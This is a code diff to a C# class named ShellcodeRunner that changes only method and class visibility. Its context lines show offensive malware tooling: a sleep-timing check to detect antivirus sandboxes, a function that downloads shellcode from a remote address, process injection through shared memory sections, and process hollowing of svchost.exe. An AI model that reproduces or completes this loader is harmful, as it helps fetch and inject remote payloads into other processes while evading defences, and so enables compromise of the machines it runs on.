@@ -4,7 +4,7 @@ using System.Text;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-public static class ShellcodeRunner
+public class ShellcodeRunner
 {
     private static string Decrypt(string enc)
     {
@@ -20,20 +20,20 @@ public static class ShellcodeRunner
         return new string(dec);
     }
 
-    public static bool DetectAV()
+    private static bool DetectAV()
     {
         DateTime now = DateTime.Now;
         Utility.Sleep(2000);
         return (DateTime.Now.Subtract(now).TotalSeconds < 1.5);
     }
 
-    public static byte[] LoadShellcode(string address)
+    private static byte[] LoadShellcode(string address)
     {
         WebClient client = new WebClient();
         return client.DownloadData(address);
     }
 
-    public static Process GetProcess(string processName)
+    private static Process GetProcess(string processName)
     {
         Process[] processes = Process.GetProcessesByName(processName);
         for (int i = 0; i < processes.Length; i++)
@@ -48,7 +48,7 @@ public static class ShellcodeRunner
         return null;
     }
 
-    public static void ProcessInjection(Process process, byte[] shellcode)
+    private static void ProcessInjection(Process process, byte[] shellcode)
     {
         // Create handle for a section in shared memory
         IntPtr sHandle = IntPtr.Zero;
@@ -106,7 +106,7 @@ public static class ShellcodeRunner
         */
     }
 
-    public static void ProcessHollowing(string filename, byte[] shellcode)
+    private static void ProcessHollowing(string filename, byte[] shellcode)
     {
         // Create process svchost.exe
         Utility.STARTUPINFO si = new Utility.STARTUPINFO();
